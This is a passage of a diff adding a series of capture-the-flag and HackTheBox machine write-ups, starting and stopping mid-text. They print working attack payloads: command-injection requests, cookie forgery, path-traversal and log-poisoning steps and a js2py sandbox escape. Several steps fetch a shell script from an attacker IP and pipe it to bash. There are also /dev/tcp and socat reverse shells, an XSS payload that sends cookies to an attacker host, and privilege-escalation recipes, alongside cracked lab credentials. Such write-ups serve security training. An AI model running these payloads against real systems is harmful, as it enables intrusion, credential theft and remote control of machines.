+		if request.method == 'POST':
+			ingredient = request.form.get('ingredient', '')
+			recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))
+
+		calc(recipe)
+
+		if garage.get(ingredient, ''):
+			return render_template('index.html', calculations=garage[ingredient])
+
+		return func(*args, **kwargs)
+	return federation
+
+@app.route('/', methods=['GET', 'POST'])
+@GCR
+def index():
+	return render_template('index.html')
+
+@app.route('/debug')
+def debug():
+	return Response(open(__file__).read(), mimetype='text/plain')
+
+if __name__ == '__main__':
+	app.run('0.0.0.0', port=1337)
+```
+
+Here we can see the exec() function used to evaluate the result. We can use this to exploit command injection and get the flag.
+
+So the final request we can send will be like this:
+```
+POST / HTTP/1.1
+Host: host:port
+Accept-Language: en-GB,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+
+ingredient=dummy&measurements=__import__('os').popen('cat+flag').read()
+```
+
+This yields the flag.
+
+### Broken Production
+
+We are greeted by a login page so let's log in. 
+
+Now there is seemingly no lead on the homepage or its source code. So let's check the cookies. Also we are provided with the source code so that obviously helps.
+
+This is the source code to SessionHandler.php
+```php
+<?php
+class SessionHandler
+{
+    public function __construct()
+    {
+        if (!empty($_COOKIE['PHPSESSID'])){
+            $this->cookie = $_COOKIE['PHPSESSID'];
+            $this->load();
+        }
+    }
+
+    public function login($username)
+    {
+        setcookie('PHPSESSID', base64_encode(json_encode([
+            'username' => $username
+        ])), time()+1333337, '/');
+    }
+
+    public function load()
+    {
+        $this->data = json_decode(base64_decode($this->cookie));
+    }
+
+    public function isLoggedIn()
+    {
+        return !is_null($this->data->username);
+    }
+
+    public function isAdmin()
+    {
+        return $this->data->username === 'admin';
+    }
+
+    public function getUsername()
+    {
+        return $this->data->username;
+    }
+
+    public function distroy()
+    {
+        unset($_COOKIE['PHPSESSID']);
+        setcookie('PHPSESSID', '', time() - 3600, '/');
+    }
+}
+```
+
+As you can see, the cookie generation mechanism is very weak as it simply base64 encodes this payload `{"username":<your_username>"}` into the session id. So we can easily spoof the admin cookie here by base64 encoding this: `{"username":"admin"}`.
+
+That gives us this: `eyJ1c2VybmFtZSI6ImFkbWluIn0`
+
+Replace this cookie in your browser and you can reach the admin panel. Here we can use 3 utilities:
+1. logs.php
+2. tickets.php
+3. todo.php
+
+All of this is controlled by the util parameter in the homepage like this:
+```
+http://host:port/?util=logs.php
+```
+
+Now just by seeing this I was pretty sure our method of gaining RCE was via log poisoning. But how?
+
+This util parameter has some protections so let's see what they are from the source code.
+
+This is what I found in views/admin.php
+
+```php
+if (isset($_GET['util']))
+        $utilFile = $_GET['util'];
+        $utilFile = str_replace("../","", $utilFile);
+
+```
+
+There we have it, a classic case of non-recursive replacing of strings. All it does is to check for any instance of `../` in a string and replace it with empty string. So to get the `../` of our desires all we do is send `....//` in its place. This ends up replacing the `../`, leaving behind another `../` that stays in the payload. So all we really need to do to bypass this is to send this payload:
+`http://host:port/?util=....//....//....//....//....//....//etc/passwd`. 
+
+This allows us to exploit an LFI.
+
+Now this puts the pieces together for us to gain RCE. So we know that the log file is located at `/var/log/nginx/access.log`. So we'll use make a request to the server by changing the `User-Agent` header to some PHP code and then use the LFI to get it to actually execute. So the final exploitation steps look something like this:
+1. Send this command `curl -A "<?php system('cat /flag*'); ?>" http://host:port/`
+2. Then visit this page: `http://host:port/?util=....//....//....//....//....//....//var/log/nginx/access.log`. 
+
+You should see your flag there :).
+
+
+
+
+
+____________________________________________________________________________________________________
+# Editor - HackTheBox Machine
+
+Difficulty: Easy
+
+---
+
+## Enumeration
+
+Run masscan and nmap to discover the following open ports 22,80,8080.
+
+80 is running a website editor.htb so let's add it to hosts. Checking around on this website there was nothing of value so I went straight to vhost fuzzing.
+
+Command:
+```bash
+ffuf -u "http://editor.htb" -H "Host: FUZZ.editor.htb" -w /usr/share/wordlists/dirb/common.txt -fl 8
+```
+This returns a subdomain called `wiki.editor.htb`. Add this to hosts.
+
+After this it was time to check around for CVEs. The version this was running was `XWiki Debian 15.10.8`. So googling around for CVEs we found this: `https://github.com/Infinit3i/CVE-2025-24893`.
+
+---
+
+## Initial Access
+
+Use this exploit after setting the appropriate parameters to gain a shell. Since my friend was having some problems with this exploit (we were doing this together) I'll explain how to use this.
+
+1. Start a netcat listener on port 31337
+2. Now, in the PoC we have to change a few settings. Change the target host to `wiki.editor.htb`, and change the local host to your HTB vpn IP.
+3. Now in a separate shell, navigate to the PoC directory and start a python server on port 8080.
+4. Run the `Reverse Shell` option on the PoC now and if you did it right, you should see a shell on the computer. Repeat this a couple times tho, since it could fail.
+
+Ok, now that that's done, it's time to get user. Read /etc/passwd to find that the home user is oliver.
+
+Now we can try and hunt config files or mysql or whatever to get any data on oliver. I used `linpeas.sh` to no avail. So I just checked config files. There I found the password to oliver.
+
+```bash
+cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep password
+```
+
+This gives the password `theEd1t0rTeam99`. Use this to ssh in as oliver.
+
+---
+
+## Privilege Escalation
+
+Now oliver cannot run `sudo -l`. So we need to look further.
+
+On enumerating with `netstat -nltp`, I found port 19999 running a service. So using the command:
+```bash
+ssh -L 19999:127.0.0.1:19999 oliver@editor.htb
+```
+
+I forwarded the port to my local machine, which showed that it was running a service called netdata. Opening this site revealed a red alert on the top of the screen, which on clicking reveals the version to be `v1.45.2`.
+
+There is a privilege escalation exploit for this detailed [here](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93).
+
+So here's what you do:
+1. Create a binary like this:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+        setuid(0);
+        setgid(0);
+        system("/bin/sh");
+        return 0;
+}
+```
+2. Compile it using `gcc exploit.c -o exploit`.
+3. Host this on your python server.
+4. Then download it onto your target machine (use curl or wget).
+5. As detailed in the link, first we will rename this file to nvme and then give it executable permissions. (I stored this file in /tmp/exploit)
+6. Now do
+
+```bash
+export PATH=/tmp/exploit:$PATH
+```
+
+7. `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`
+
+This should log you in as root.
+
+--- 
+
+
+
+
+____________________________________________________________________________________________________
+# Previous: HackTheBox
+
+Difficulty: Medium (I'd say this was pretty easy).
+
+---
+
+## Enumeration
+
+port 22,80 open with port 80 having hostname http://previous.htb/
+
+/docs endpoint is vulnerable to [this exploit](https://github.com/MuhammadWaseem29/CVE-2025-29927-POC?tab=readme-ov-file#proof-of-concept-steps).
+
+I used burpsuite's match and replace rules to add in the new exploit header. To do this, simply go to proxy settings and go to match and replace. Then add a new rule, and leave the match section blank. Place the exploit header in the replace section, and you should be able to get the exploit going.
+
+Now I found an LFI in the /api/download?example=<filename> endpoint, by sending `../../../../../etc/passwd` I was able to recover this:
+```
+root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+node:x:1000:1000::/home/node:/bin/sh
+nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
+```
+This is actually the docker container path so this doesn't contain any real users on the host system.
+
+Environment variables from ../../../app/.env (I found the location of the app by reading /proc/self/environ)
+```
+NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
+```
+
+There are also useless lol.
+
+Through a lot of ChatGPT, found this page  `../../../../app/.next/server/pages/api/auth/[...nextauth].js` which reveals some credentials.
+
+Credentials: `jeremy:MyNameIsJeremyAndILovePancakes`
+
+This gives us ssh access and user flag.
+
+## Privilege Escalation
+
+Running `sudo -l` gives this:
+
+```bash
+Matching Defaults entries for jeremy on previous:
+    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jeremy may run the following commands on previous:
+    (root) /usr/bin/terraform -chdir\=/opt/examples apply
+```
+
+<!-- Got the PE Vector from [this article](https://medium.com/@toshithh/proof-of-concept-terraform-privilege-escalation-cd3db69df90e). Ok this is literally the fucking writeup for this machine's PE lol, I didnt even notice until I read the whole thing. Luckily I didnt understand what he did here lol so I will explain what I did -->
+
+See [this article](https://dollarboysushil.com/posts/Terraform-Sudo-Exploit-Privilege-Escalation/) to avoid spoilers.
+
+So I changed up the exploit a little here so let me walk you through the steps:
+
+1. First do 
+
+```bash
+cat /opt/examples/*.tf
+```
+This gives the provider name. (honestly it doesnt matter here)
+
+2. In the /tmp directory, make a directory called privesc.
+3. Run this:
+
+```bash
+cat > /tmp/privesc/terraform-provider-examples << 'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+```
+4. Run this too
+
+```bash
+chmod +x /tmp/privesc/terraform-provider-examples
+```
+5. Run this again lol:
+
+```bash
+cat > /tmp/privesc/dollarboysushil.rc << 'EOF'
+provider_installation {
+  dev_overrides {
+    "dollarboysushil.com/terraform/examples" = "/tmp/privesc"
+  }
+  direct {}
+}
+EOF
+```
+
+6. Run `export TF_CLI_CONFIG_FILE=/tmp/privesc/dollarboysushil.rc`
+
+7. cd to `/opt/examples`
+
+8. `sudo /usr/bin/terraform -chdir=/opt/examples apply`
+
+9. `/bin/bash -p`
+
+You should have a root shell.
+
+
+
+
+____________________________________________________________________________________________________
+# CodeTwo: HackTheBox
+
+Difficulty: Easy
+
+---
+
+## Enumeration
+Ports: 22,80
+
+There is a login page, and a signup page, was nothing suspicious here.
+
+After signing up I went to /dashboard which had a code editor in it.
+
+`/download` endpoint allows you to download the source code to the app, where we can see that it uses js2py.
+
+I used a modified version of [this exploit](https://github.com/advisories/GHSA-r9pp-r4xf-597r) to gain the shell, I have included my payload below
+
+```javascript
+let cmd = "curl http://10.10.14.152:8000/shell.sh | bash"
+let hacked, bymarve, n11
+let getattr, obj
+
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.__getattribute__
+n11 = bymarve("__getattribute__")
+obj = n11("__class__").__base__
+getattr = obj.__getattribute__
+
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+            return item
+        }
+        if(item.__name__ != "type" && (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true);
+n11
+```
+
+Shell.sh hosted on my machine:
+
+```bash
+#!/bin/bash
+
+sh -i >& /dev/tcp/10.10.14.152/4444 0>&1
+```
+
+Once you gain shell, in `~/app/instance/users.db` we can find a users table, on cracking the hash (which is md5) we get the credentials:
+`marco:sweetangelbabylove`
+
+Use this to get ssh login and user flag.
+
+## Privilege Escalation
+
+Running sudo -l gives this:
+
+```bash
+Matching Defaults entries for marco on codetwo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codetwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+```
+
+Malicious npbackup.conf
+
+```bash
+conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /root/
+      source_type: folder_list
+      exclude_files_larger_than: 10000000.0
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      stdin_from_command:
+      stdin_filename:
+      tags: []
+      compression: auto
+      use_fs_snapshot: true
+      ignore_cloud_files: true
+      one_file_system: false
+      priority: low
+      exclude_caches: true
+      excludes_case_ignore: false
+      exclude_files:
+      - excludes/generic_excluded_extensions
+      - excludes/generic_excludes
+      - excludes/windows_excludes
+      - excludes/linux_excludes
+      exclude_patterns: []
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      minimum_backup_size_error: 0 MiB
+      pre_exec_commands: []
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: []
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+      repo_password_command:
+      minimum_backup_age: 1440
+      upload_speed: 800 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        tags: []
+        keep_within: true
+        group_by_host: true
+        group_by_tags: true
+        group_by_paths: false
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+    is_protected: false
+identity:
+  machine_id: ${HOSTNAME}__blw0
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+  no_cert_verify: false
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 5
+  auto_upgrade_interval: 15
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
+```
+
+So I got this by simply modifying the npbackup.conf in our home directory. So I copied it to a directory I made in /tmp. Then I saved this npbackup.conf.
+
+Then run the commands:
+
+1. `sudo /usr/local/bin/npbackup-cli -c npbackup.conf -b`
+2. `sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/root.txt`
+
+This will give root. You can also read the ssh private key of `/root` if you want root access.
+
+
+
+
+____________________________________________________________________________________________________
+# Soulmate: HackTheBox
+
+Difficulty: Easy (very shit machine ngl)
+
+## Enumeration
+Port 80 -> 2 subdomains soulmate.htb and ftp.soulmate.htb 
+
+ftp subdomain is protected by CrushFTP which is vulnerable to the login bypass, mainly [this exploit](https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py).
+
+So using this exploit create a new user, and then using this new admin user, change the password of the ben account, and login using this.
+
+Using the new login as ben, modify the config of the `webprod/` folder and allow file uploads. This is where we'll upload our reverse shell. I uploaded my own custom webshell in php to gain a basic webshell but you can also use the [p0wny shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php).
+
+Use this to gain a standard reverse shell.
+
+After the getting the shell, in `/var/www/html/soulmate.htb/data` I found this in the db entry
+
+```
+1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2
+```
+
+So let's crack the password
+
+This didnt yield much, but on checking the stuff in linpeas.sh this stood out
+
+```bash
+root        1143  0.0  1.6 2251672 67380 ?       Ssl  05:03   0:06 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
+```
+
+So I checked this script, located in `/usr/local/lib/erlang_login/start.escript` got the credentials to ben user. This yields user flag.
+
+Credentials:
+
+```
+{"ben", "HouseH0ldings998"}
+```
+
+## Privilege Escalation
+
+To gain root, all you really need to do is to check the running services. Here you can see a service running in port 2222. This is the Erlang SSH service. Connect to it using
+
+```bash
+ssh 127.0.0.1 -p 2222
+```
+
+Then use the password of `ben` to gain access.
+
+Use the command `os:cmd("cat /root/root.txt").` to get the flag.
+
+
+
+
+____________________________________________________________________________________________________
+# Expressway: HackTheBox
+
+Difficulty: Easy (very non-standard box)
+
+## Enumeration
+
+On doing masscan we see only port 22 open. But I tried other ways to check the open ports (mainly nmap -sU -F) and it returned port 500. Idk why masscan didnt work because I use the "U" flag there also. I figured this out only due to a shit ton of hints from htb discord.
+
+## Initial Foothold
+
+So to pentest isakmp I used [this article](https://blog.silentsignal.eu/2014/04/17/isakmp-aggressive-psk-tools/)
+
+So I used these 2 snippets:
+
+```bash
+sudo ike-scan -A --trans=5,2,1,2 --id=vpnclient -Ppsk.txt 10.129.174.173
+```
+
+This gives a username `ike@expressway.htb`
+
+```bash
+psk-crack -d /usr/share/wordlists/rockyou.txt psk   
+```
+
+This will give the password
+
+From this you can see this set of credentials:
+
+```
+ike@expressway.htb:freakingrockstarontheroad
+```
+
+## Privilege Escalation
+
+Just use [this script](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh) after initial access to run as root.
+
+Overall pretty mid box (just user access, but its my skill issue I guesss). Aside from that pretty nice, HIHGLY beginner oriented lol.
+
+Happy Hacking :)
+
+
+
+
+____________________________________________________________________________________________________
+# Imagery: HackTheBox
+
+## Enumeration
+
+Port 22,8000 were open.
+
+## Initial Access
+
+The first step is to sign up and make an account. Now we can poke around the webpage, there doesnt seem to be much. But on inspecting the source I saw a shit ton of JS, which my browser refused to show. So I used the below script to get the js from the page.
+
+### Quick Script I wrote to extract all the JS from the page
+
+```python
+
+import requests
+from bs4 import BeautifulSoup
+
+url = "http://imagery.htb:8000"
+cookies = {"session":".eJyrVkrJLC7ISaz0TFGyUkoySzNJSU5KVNJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCLzk_V6kWAMF-Lxg.aNyIaw.YZHWU417HjNhJPyfxYZH39MR1Tk"}
+
+# Get the webpage
+
+print("[*] Getting the webpage")
+
+res = requests.get(url, cookies=cookies)
+if res.status_code == 200:
+    print("[+] SUccessfully got webpage")
+else:
+    print("[-] An error occured")
+    exit(1)
+
+print("[*] Obtaining script tags")
+parser = BeautifulSoup(res.text, "html.parser")
+js = parser.find_all("script")
+
+print("[*] Writing output to file")
+with open("source.js", mode="w") as file:
+    file.write(js[2].text)
+
+print("[+] Successfully written output to file")
+```
+
+From the code we can see that the /submit_report endpoint is vulnerable to XSS because the report description is not sanitized by DOMPurify. So I will just provide in a title and the description of the bug will be 
+
+```html
+<img src=x onerror="fetch('http://<ip>:<port>/?c='+document.cookie)" />
+```
+
+This will reveal the admin session cookie.
+
+Using this we'll login to the admin panel. (simply modify the existing cookie on the webpage)
+
+From here the download logs functionality is vulnerable to classic LFI `/admin/get_system_log?log_identifier=../../../../etc/passwd`.
+So let's try and read some source code from `../app.py`.
+
+Based on the source code we can construct a directory structure like this for the app:
+```
+project/
+│
+├── app.py                         # The main entry point (your provided script)
+├── config.py                      # Configuration variables (e.g., SYSTEM_LOG_FOLDER, BLOCKED_APP_PORTS)
+├── utils.py                       # Contains _load_data(), _save_data(), etc.
+│
+├── templates/
+│   └── index.html                 # Template rendered at the root endpoint ('/')
+│
+├── api_auth.py                    # Blueprint for authentication
+├── api_upload.py                  # Blueprint for upload handling
+├── api_manage.py                  # Blueprint for managing uploaded content
+├── api_edit.py                    # Blueprint for editing content
+├── api_admin.py                   # Blueprint for admin-related routes
+├── api_misc.py                    # Blueprint for miscellaneous routes
+│
+├── db.json                          # location for your data file (used by _load_data / _save_data, read from config.py)
+│
+├── logs/                          # User log files stored here (matches SYSTEM_LOG_FOLDER)
+│   └── <username>.log             # One log file per user
+│
+└── static/                        # (Optional) For serving static assets like JS, CSS, images
+    └── ...                        # Static files here
+
+```
+
+This is db.json
+
+```json
+{
+    "users": [
+        {
+            "username": "admin@imagery.htb",
+            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
+            "isAdmin": true,
+            "displayId": "a1b2c3d4",
+            "login_attempts": 0,
+            "isTestuser": false,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        },
+        {
+            "username": "testuser@imagery.htb",
+            "password": "2c65c8d7bfbca32a3ed42596192384f6",
+            "isAdmin": false,
+            "displayId": "e5f6g7h8",
+            "login_attempts": 0,
+            "isTestuser": true,
+            "failed_login_attempts": 0,
+            "locked_until": null
+        }
+    ],
+    "images": [],
+    "image_collections": [
+        {
+            "name": "My Images"
+        },
+        {
+            "name": "Unsorted"
+        },
+        {
+            "name": "Converted"
+        },
+        {
+            "name": "Transformed"
+        }
+    ],
+    "bug_reports": [
+        {
+            "id": "f15a79b2-451c-4907-9a56-c6399beb16e3",
+            "name": "Hacked !!!",
+            "details": "<img src=x onerror=\"fetch('http://10.10.14.156:8000/?c='+document.cookie)\"/>",
+            "reporter": "test@test.com",
+            "reporterDisplayId": "b6f4dcba",
+            "timestamp": "2025-10-01T02:03:38.823828"
+        }
+    ]
+}
+```
+
+
+From cracking the passwords in db.json we can get this credential set:
+`testuser@imagery.htb:iambatman`
+
+```
+POST /apply_visual_transform HTTP/1.1
+Host: imagery.htb:8000
+Content-Length: 156
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://imagery.htb:8000
+Referer: http://imagery.htb:8000/
+Accept-Encoding: gzip, deflate, br
+Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aNySeQ.ibhlu71PKo_UUrsWbcSakgaALbY
+Connection: keep-alive
+
+{"imageId":"41d55ddd-6361-46a5-9b8c-a678791ef40d","transformType":"crop","params":{"x":"79; curl http://10.10.14.156:8000;","y":0,"width":638,"height":800}}
+```
+
+Crop image functionality has os command injection
+
+`{"imageId":"41d55ddd-6361-46a5-9b8c-a678791ef40d","transformType":"crop","params":{"x":"79; $(curl http://10.10.14.156:8000/shell.sh | bash) #","y":0,"width":638,"height":800}}` send this to gain shell.
+
+By analyzing the source code of the admin bot we get this credential set:
+`admin@imagery.htb:strongsandofbeach`
+
+None of these yielded anything. Now in /var/backup there was a backup just chilling there. But it was encrypted with AES. So I downloaded it onto my machine and checked its filetype.
+
+I got this
+
+```bash
+web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
+```
+
+So with this data I got this script that bruteforces the AES password:
+
+```python
+#!/usr/bin/env python3
+import pyAesCrypt
+import sys
+import os
+
+if len(sys.argv) < 3:
+    print("Usage: python try_wordlist_pyAesCrypt.py file.zip.aes wordlist.txt [outdir]")
+    sys.exit(1)
+
+encfile = sys.argv[1]
+wordlist = sys.argv[2]
+outdir = sys.argv[3] if len(sys.argv) > 3 else "attempt_out"
+os.makedirs(outdir, exist_ok=True)
+
+# chunk size used by pyAesCrypt (default value).
+bufferSize = 64 * 1024
+
+total = 0
+with open(wordlist, "r", errors="ignore") as f:
+    for line in f:
+        pwd = line.rstrip("\n\r")
+        if not pwd:
+            continue
+        total += 1
+        if total % 1000 == 0:
+            print(f"Attempt #{total}: '{pwd[:30]}'")
+        outpath = os.path.join(outdir, "temp_decrypted_output")
+        try:
+            # pyAesCrypt.decryptFile throws ValueError on wrong password (or IntegrityError)
+            pyAesCrypt.decryptFile(encfile, outpath, pwd, bufferSize)
+            print()
+            print("=== Password found! ===")
+            print(pwd)
+            print("Decrypted output saved to:", outpath)
+            sys.exit(0)
+        except (ValueError, Exception) as e:
+            # Wrong password will generally raise ValueError / IntegrityError
+            # Remove any incomplete file
+            if os.path.exists(outpath):
+                try:
+                    os.remove(outpath)
+                except:
+                    pass
+            # continue trying
+            continue
+
+print("Password NOT found in the provided wordlist.")
+sys.exit(2)
+
+```
+
+Courtesy of chatgpt lol. 
+
+When using rockyou.txt it yields `bestfriends` as the password. Now this just contains the web directory we saw on initial access but with a new password for a user `mark`. So the credentials are `mark:supersmash`.
+
+Now that that's done let's `su mark` and get user flag.
+
+## Privilege Escalation
+
+Now on running `sudo -l` you can see this
+
+```bash
+Matching Defaults entries for mark on Imagery:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mark may run the following commands on Imagery:
+    (ALL) NOPASSWD: /usr/local/bin/charcol
+```
+
+So we'll exploit that using it's help menu to read the docs (couldnt find this thing online idk why).
+
+First I ran:
+
+```bash
+sudo /usr/local/bin/charcol -R
+```
+
+This completely resets the password (I saw this from the help menu.)
+Then run this
+
+```bash
+sudo /usr/local/bin/charcol shell
+```
+
+Now you can enter the shell. After this we will schedule a malicious cron job that will give privileged mode to bash.
+
+So I did this in the charcol shell
+
+```bash
+auto add --schedule "* * * * *" --command "chmod +s /bin/bash" --name "hack"
+```
+
+Wait for a bit and then run `/bin/bash -p`. You will get root.
+
+
+
+
+____________________________________________________________________________________________________
+# Animetronic - A HackMyVM Machine
+
+## Enumeration
+MACHINE IP: `***MACHINE IP***`
+
+On bruteforcing subdomains we get the following:
+1. js
+2. css
+3. img
+4. staffpages
+5. server-status
+
+staffpages is 403 forbidden but by using a tool called 403bypasser we get this output
+
+```
+GET --> http://192.168.0.104                                                                        STATUS: 200 SIZE: 2384
+Header= {'X-Original-URL': '/staffpages'}
+
+GET --> http://192.168.0.104                                                                        STATUS: 200 SIZE: 2384
+Header= {'X-Rewrite-URL': '/staffpages'}
+```
+
+So let's add these headers in burpsuite and see if we can gain access to this page.
+
+This didnt work. But fuzzing subdomains in the /startpages directory revealed a `new_employees` page.
+
+We find an image here. Now we can save this image and use exiftool to get its exif data.
+
+```
+ExifTool Version Number         : 12.76
+File Name                       : new_employees.jpeg
+Directory                       : .
+File Size                       : 160 kB
+File Modification Date/Time     : 2024:05:05 11:24:09+05:30
+File Access Date/Time           : 2024:05:05 11:24:09+05:30
+File Inode Change Date/Time     : 2024:05:05 11:24:09+05:30
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : page for you michael : ya/HnXNzyZDGg8ed4oC+yZ9vybnigL7Jr8SxyZTJpcmQx53Xnwo=
+Image Width                     : 703
+Image Height                    : 1136
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 703x1136
+Megapixels                      : 0.799
+```
+By decrypting this, which is just base64, we get this: ***ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן***
+
+Now, this is just the string `message_for_michael` written upside down.
+
+Navigating to the `/staffpages/message_for_michael/` directory we get some stuff written there.
+
+And, it says that there is a file called `personal_info.txt`
+
+Let's see what's in it.
+
+*File contents*:
+
+```
+name: Michael
+
+age: 27
+
+birth date: 19/10/1996
+
+number of children: 3 " Ahmed - Yasser - Adam "
+
+Hobbies: swimming 
+```
+## Initial Access
+
+On reading the file, I get a hunch that what we're looking at is a way to bruteforce the ***ssh*** login.
+I am going to simply assume that the username is michael.
+So we need to come up with a wordlist to try and guess the password, based on what we have here in `personal_info.txt`
+
+After Generating a wordlist with *cupp.py* we get the credentials
+***michael:leahcim1996***
+
+On log in, you can cd to the <u>henry</u> home file, which gives the *user flag*.
+
+Now, on reading the Note.txt file, and decrypting the given base64 string, we get that the password is stored in <u>henrypassword.txt</u>.
+
+The new obtained credentials are as follows:
+***henry:IHateWilliam***
+
+Log in as henry.
+
+## Privilege Escalation
+
+By running:
+ 
+```bash
+sudo -l
+```
+
+We find that *socat* can be run as root. So let's spawn a reverse shell, so that we can get a root shell out of it.
+
+On the target machine run this command:
+
+```bash
+sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker_ip:attacker_port
+```
+
+And on the attacker machine run:
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:4444
